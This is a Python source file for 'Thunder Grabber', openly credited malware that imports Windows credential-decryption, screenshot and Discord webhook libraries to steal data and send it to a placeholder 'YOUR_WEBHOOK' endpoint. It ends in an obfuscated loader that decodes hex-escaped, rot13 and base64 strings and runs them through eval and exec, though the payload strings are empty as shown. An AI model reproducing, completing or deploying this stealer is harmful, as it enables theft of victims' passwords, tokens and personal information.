#Thunder Grabber Was Made BY TWISTX7#9122
#https://github.com/TWIST-X7/Thunder-Grabber

import base64
import codecs
import requests
import os
import json
import winreg
import shutil
import psutil
import random
import zipfile
import socket
import sqlite3
import platform
import win32crypt
import subprocess
import sys
import httpx

from Cryptodome.Cipher import AES
from subprocess import PIPE, Popen
from win32crypt import CryptUnprotectData
from PIL import ImageGrab
from json import load
from sys import argv
from threading import Thread
from re import findall, match
from urllib.request import urlopen
from discord import File, Webhook, RequestsWebhookAdapter
from discord_webhook import DiscordWebhook, DiscordEmbed
from getmac import get_mac_address as gma

weblink = "YOUR_WEBHOOK"
#The injection Was Mad By Rdimo#6968
injection = "YES_NO"


magic = ''
love = ''
god = ''
destiny = ''
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
